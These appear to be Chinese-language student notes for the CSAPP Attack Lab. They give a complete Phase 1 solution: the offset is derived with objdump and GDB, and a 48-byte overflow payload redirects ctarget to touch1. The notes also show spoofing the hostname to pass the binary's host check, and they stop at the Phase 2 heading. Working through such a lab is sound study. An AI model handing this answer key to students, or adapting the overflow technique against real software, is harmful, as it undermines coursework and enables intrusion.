# Lab 3 — Attack Lab: Understanding Buffer Overflow Bugs

## 实验目标

通过构造输入字节序列，利用目标程序的栈缓冲区溢出漏洞，改变程序的执行流程，调用指定的目标函数。实验过程中保持 `ctarget`、`rtarget` 二进制文件不变。

与 Bomb Lab 分析程序、寻找满足判断条件的输入不同，本实验重点是理解：输入如何覆盖栈上的数据，以及如何通过返回地址控制程序执行。

## 五个阶段

| 阶段    | 目标程序    | 要完成的事                                                         |
| ------- | ----------- | ------------------------------------------------------------------ |
| Phase 1 | `ctarget` | 利用缓冲区溢出覆盖返回地址，让程序执行 `touch1`                  |
| Phase 2 | `ctarget` | 注入代码，调用 `touch2`，并将 cookie 作为整数参数传入            |
| Phase 3 | `ctarget` | 注入代码，调用 `touch3`，并传入指向 cookie 十六进制字符串的指针  |
| Phase 4 | `rtarget` | 使用已有指令片段组合执行，即 ROP，完成 `touch2` 的调用与参数传递 |
| Phase 5 | `rtarget` | 使用 ROP，完成 `touch3` 的调用与字符串指针传递                   |

代码注入是让程序执行输入中包含的机器指令；ROP（返回导向编程）则利用程序已有的、通常以 `ret` 结尾的短指令片段（gadget），组合出需要的操作。

## 文件说明

| 文件              | 用途                                                    |
| ----------------- | ------------------------------------------------------- |
| `ctarget`       | Phase 1～3 使用的目标程序                               |
| `rtarget`       | Phase 4～5 使用的目标程序                               |
| `cookie.txt`    | 本实验实例的 cookie，用于目标函数的参数验证             |
| `farm.c`        | `rtarget` 中 gadget farm 的源代码，可辅助寻找指令片段 |
| `hex2raw`       | 将十六进制文本转换成实际输入字节                        |
| `attacklab.pdf` | 实验说明，包含输入格式、允许的攻击范围及各阶段规则      |

## 基本流程

1. 查看 `attacklab.pdf` 中当前阶段的目标和限制。
2. 用 `objdump` 查看反汇编，用 GDB 观察栈布局、返回地址和参数寄存器。
3. 将构造的输入字节写成十六进制文本，再用 `hex2raw` 转成原始输入。
4. 把字节输入对应的目标程序，检查是否触发指定函数并通过参数验证。

重点复习 CSAPP 第三章的栈与函数调用、寄存器传参、机器指令编码及缓冲区溢出防护。具体的可用地址和 gadget 范围以实验文件为准。

## Phase 1

### 操作步骤

以下步骤以 `attacklab` 目录为当前目录，并针对本目录里的 `ctarget`。这份程序启动时会检查主机名；如果看到 `illegal host [主机名]`，先在当前 WSL 会话设置为二进制白名单中的名称，再继续：

```bash
sudo hostname whaleshark.ics.cs.cmu.edu
hostname
```

确认 `hostname` 输出为 `whaleshark.ics.cs.cmu.edu`。这个设置用于当前 WSL 会话，重启后可能需要重新设置。

#### 1. 导出并查看整份反汇编

在 `attacklab` 目录运行：

```bash
objdump -d ctarget > ctarget_disassembly.txt
```

这会把 `ctarget` 的反汇编保存到 `ctarget_disassembly.txt`。直接ctrl+f

先看 `<test>` 中调用 `getbuf` 的位置，确认程序会经过 `getbuf`；再看 `<getbuf>`，重点找 `sub $0x28,%rsp`、`mov %rsp,%rdi` 和调用 `Gets` 的指令；最后看 `<touch1>` 标题左边的地址。以下地址和指令都来自这份反汇编文件。

#### 2. 在 GDB 中读取运行时栈指针

```bash
gdb ./ctarget
```

在 GDB 提示符下输入：

```gdb
(gdb) break getbuf
(gdb) run
(gdb) info registers rsp
(gdb) x/gx $rsp
```

`break getbuf` 会在 `getbuf` 第一条指令执行前停下。`info registers rsp` 显示此刻的栈指针；`x/gx $rsp` 查看该地址处的 8 字节内容。函数入口处 `%rsp` 指向保存的返回地址。本次运行中入口 `%rsp` 是 `0x5561dca0`。这是运行时栈地址示例，不需要把它加上 64。

#### 3. 从反汇编计算缓冲区与返回地址的距离

在 `ctarget_disassembly.txt` 的 `<getbuf>` 部分找到：

```asm
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28           sub    $0x28,%rsp
  4017ac: 48 89 e7              mov    %rsp,%rdi
  4017af: e8 8c 02 00 00        call   401a40 <Gets>
```

`sub $0x28,%rsp` 表示 `getbuf` 执行时把栈指针减去 `0x28`，即 40 字节；随后 `mov %rsp,%rdi` 把新的栈指针作为缓冲区地址传给 `Gets`。因此缓冲区起始位置是入口 `%rsp - 0x28`。本次运行中是 `0x5561dca0 - 0x28 = 0x5561dc78`。

入口 `%rsp` 指向保存的返回地址，而缓冲区从新 `%rsp` 开始，所以保存的返回地址位于缓冲区起始处往后 `0x28`（40）字节。输入前 40 字节填充到返回地址，接下来 8 字节覆盖它。64 位地址本身占 8 字节，不能把“64 位”当成 64 字节偏移。

如果想在 GDB 里亲自核对计算，可以在断点处单步执行反汇编中的前两条指令：

```gdb
(gdb) stepi
(gdb) info registers rsp
(gdb) stepi
(gdb) info registers rdi rsp
```

第一条 `stepi` 后，`%rsp` 应比入口值小 `0x28`；第二条后，`%rdi` 应与新的 `%rsp` 相同。以本次地址为例，二者都是 `0x5561dc78`。这一步是用 GDB 验证从反汇编得出的结论；Phase 1 的偏移也可以直接由 `sub` 指令算出。

Phase 1 只需覆盖保存的返回地址，不需要把跳转目标指向缓冲区，因此不必把栈地址写进输入。换一次运行时，栈地址可能不同；本次运行记录的地址只用于理解栈布局。

#### 4. 从反汇编找到 `touch1` 地址并按小端序写入

在 `ctarget_disassembly.txt` 中找到 `<touch1>:`，标题左边就是函数地址。本实验这份二进制中地址是 `0x4017c0`。目标地址要写满 8 字节；x86-64 使用小端序，所以最低位字节放在最前面：

```text
地址：0x00000000004017c0
字节：c0 17 40 00 00 00 00 00
```

#### 5. 创建输入文件

在另一个终端或退出 GDB 后，在 `attacklab` 目录创建 `phase1.txt`。文件中写入 40 个填充字节，再紧接着写入 `touch1` 地址的 8 个字节：

```text
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

每个两位十六进制数代表一个字节；前四行共 40 字节，用来填充到返回地址，最后一行的 8 字节覆盖返回地址。这里用 `00` 作为填充值，其他可输入字节也可以用于填充。

#### 6. 转换并运行

在 `attacklab` 目录运行：

```bash
./hex2raw < phase1.txt | ./ctarget -q
```

`hex2raw` 把文本中的十六进制字节转换成原始字节，再通过管道交给 `ctarget`。`-q` 表示不向课程服务器提交结果。成功时，程序会显示 `Touch1!` 相关提示，表明返回地址已被改写并执行了 `touch1`。

## Phase 2
